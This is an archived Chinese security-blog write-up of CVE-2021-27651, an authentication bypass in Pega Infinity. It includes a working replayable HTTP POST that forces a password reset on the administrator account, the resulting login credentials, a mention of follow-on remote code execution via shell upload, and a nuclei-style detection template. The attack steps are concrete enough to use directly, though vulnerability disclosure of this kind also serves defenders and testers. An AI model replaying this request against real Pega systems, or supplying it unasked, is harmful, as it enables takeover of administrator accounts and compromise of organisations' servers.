---
cve: "CVE-2021-27651"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  Pega Infinity - 绕过身份验证[CVE-2021-27651]   
_7ingLian  偏远酒馆   2025-04-24 03:36  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibqWGD93gcqIia6rwoa6Ex5b6D1CDj7FC5MrZn00B8rdTgvHWpYMUgS8iaDTicmb1obUoN8VEkvwY92XMr7XIfXGw/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC6TPeG2dkwjCcbyCSX68lItlSsQFThaWupVms88KGHQMozur7n83IBgQe13iboB9k4QX9mmbyqWbOw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
CVE-2021-27651  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/l8UzsHjZBUkicvzLrJysUqiavdGwOPVCtxzkH7GfsKt6awLq96X4RqeGuay4CfPnLm7J1Oh2INENyooZrEDqaicNA/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**免责声明**  
  
  
  
我们发布的内容仅作为测试和学习交流，禁止用于未授权场景。任何人不得将其用于非法目的。我方对于阅读本文技术引起的法律责任概不负责。  
  
  
  
--->漏洞描述  
  
Pega Infinity 版本8.2.1到8.5.2包含身份验证绕过漏洞，因为本地账户的密码重置功能可用于绕过本地身份验证检查。  
  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td colspan="4" data-colwidth="118,166,126,270" valign="bottom" align="center" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;color: rgb(205, 205, 205) !important;background-color: rgb(122, 68, 66);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(163, 163, 163);font-family: 苹方简常规;font-size: 16px;letter-spacing: 0.544px;text-align: left;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;letter-spacing: 0.544px;caret-color: red;font-size: 14px;text-indent: 0em;color: rgb(255, 255, 255);visibility: visible;"><span leaf="">漏洞概述</span></span></strong></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;visibility: visible;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(0, 122, 170);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span class="js_darkmode__7" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;background-color: rgb(255, 255, 255);color: rgb(122, 68, 66);font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;letter-spacing: 0.544px;text-align: center;visibility: visible;"><span leaf="">漏洞名称</span></span></strong></span></p></td><td colspan="3" data-colwidth="166,126,270" width="270" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span class="js_darkmode__8" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);visibility: visible;"><span leaf="">Pega Infinity - 绕过身份验证</span></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;visibility: visible;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span class="js_darkmode__9" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="">漏洞编号</span></strong></span></p></td><td colspan="3" data-colwidth="166,126,270" width="270" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span class="js_darkmode__10" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);visibility: visible;"><span leaf="">CVE-2021-27651</span></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span class="js_darkmode__11" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">公开时间</span><span leaf=""><br/></span></span></strong></p></td><td colspan="3" data-colwidth="166,126,270" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><span class="js_darkmode__12" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">2021</span></span></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__13" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="">漏洞等级</span></strong></span></p></td><td data-colwidth="166" width="166" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__14" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">严重</span></span></p></td><td data-colwidth="126" width="126" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span class="js_darkmode__15" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">评分</span></span></strong></p></td><td data-colwidth="270" width="144" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__16" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">9.8</span></span><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(0, 122, 170);"></span></strong></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;height: 39px;"><td data-colwidth="118" width="65" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__17" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="">POC是否公开</span></strong></span></p></td><td data-colwidth="166" width="166"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;clear: both;min-height: 1em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;color: rgb(122, 68, 66);box-sizing: border-box !important;overflow-wrap: break-word !important;">是</span></p></td><td data-colwidth="126" width="126" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__19" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="">EXP是否公开</span></strong></span></p></td><td data-colwidth="270" width="144" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 8px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(76, 76, 76);max-width: 100%;box-sizing: border-box !important;font-size: 10pt;vertical-align: top;"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;"><span class="js_darkmode__20" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(122, 68, 66);"><span leaf="">是</span></span></p></td></tr></tbody></table>  
  
--->影响版本  
  
Pega Infinity >= 8.2.1 Pega Infinity <= 8.5.2  
  
  
--->漏洞详情  
  
An attacker can bypass all stages of the password reset flow and reset any user's account on Pega infinity. This is done by (1) initiating the password reset flow and typing in the victim email, then (2) forcing the HTTP POST request to update the password through. An attacker could login using the newly edited account and fully compromise the Pega instance via the many acceptable post-auth code execution vectors (modifying dynamic pages, templating, etc.)  
  
  
--->漏洞复现  
  
1. Browse to the login page of any Pega instance  
  
  
2. Click "reset password"  
  
  
3. Type in "administrator@pega.com", proxy the HTTP request, send the HTTP request with the "administrator@pega.com" to the Burp repeater tab or any similar tab, then allow the request to go through by disabling the proxy or clicking "send"  
  
  
4. After allowing the initial request to go through, modify the HTTP requests body in the repeater so it includes the following data...  
```
POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: https://redacted.com
DNT: 1
Connection: close
Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
Cookie: yourCookie
Upgrade-Insecure-Requests: 1

pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword=
```  
  
5. Login using the following credentials after sending the HTTP request, having bypassed the confirmation part of reset password and being able to login to the administrator account...  
```
administrator@pega.com / Rules@1234
```  
  
![Password bypass](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibqWGD93gcqIia6rwoa6Ex5b6D1CDj7FCPaiapzXby7haa7uNLic38gC9h8HmSczPxFHn58buQcP7cEBdyic60eL8w/640?wx_fmt=png&from=appmsg "")  
  
Password bypass  
  
Remote code execution via shell upload  
  
![Remote code execution via shell upload](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibqWGD93gcqIia6rwoa6Ex5b6D1CDj7FCicYhRRIePz66p2XkgcUnClkrianf8mP43rOia12Wy6vgjHUic2c1u5KwkQ/640?wx_fmt=png&from=appmsg "")  
  
  
--->POC  
```
id: pega

info:
  name: Pega Infinity Login
  author: sshell
  severity: low

requests:
  - method: GET
    path:
      - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    matchers:
      - type: word
        words:
          - "Pega API"
```  
  
--->Exploit Video  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
